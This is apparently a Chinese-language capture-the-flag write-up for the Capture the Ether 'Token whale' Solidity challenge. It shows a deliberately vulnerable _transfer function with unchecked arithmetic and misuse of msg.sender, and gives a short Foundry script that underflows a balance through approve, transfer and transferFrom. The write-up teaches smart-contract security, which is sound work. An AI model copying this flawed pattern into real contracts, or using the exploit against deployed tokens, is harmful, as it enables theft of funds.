# Token whale

## 题目描述

[原题链接](https://capturetheether.com/challenges/math/token-whale/)

原题目要求 TokenWhaleChallenge 合约里的 player 的 token 余额大于 1000000。最开始的时候会给 player 1000 初始 token 余额。

## 运行

**安装 Foundry**

根据 [Foundry 官方文档](https://getfoundry.sh/)配置好运行环境。

**运行测试**

```sh
$ cd WTF-CTF

$ forge test -C src/Capture_the_Ether/Math/Token_sale -vvv
```

## 功能简述

在原题 `^0.4.21` 版本下，所有的算术操作都是 unchecked，因此为了能够复现这个 Challenge，我给 _transfer 里面的某一行增加了 unchecked。

TokenWhaleChallenge 的合约不符合 ERC20 标准（没有返回 bool），只是使用了类似的接口。

TokenWhaleChallenge 里面的 _transfer() 函数实现有问题：

```solidity
    function _transfer(address to, uint256 value) internal {
        unchecked {
            balanceOf[msg.sender] -= value;
        }
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
    }
```

1. 内部/私有函数不应该使用 `msg.sender` 等这样的全局变量，最好使用参数传进来。这导致 `transferFrom` 并不是从 from 而是从 msg.sender 里面扣除余额。
2. 没有进行 Math 操作的检查。

解决思路是，player（alice）和她的同伙（bob）一起操作：
1. bob approve alice 1 token
2. alice 将她的所有余额转移给 bob
3. alice 调用 `transferFrom(bob, address(0), 1)`，这时 bob 的余额大于等于 1；`allowance[bob][alice] >= 1`，接着会执行 `_transfer(to, value)`，将 alice 的余额减 1，实现下溢出。

```solidity
        vm.startPrank(bob);
        tokenWhaleChallenge.approve(alice, 1);
        vm.stopPrank();

        vm.startPrank(alice);
        tokenWhaleChallenge.transfer(bob, 1000);
        tokenWhaleChallenge.transferFrom(bob, address(0), 1);
        vm.stopPrank();
```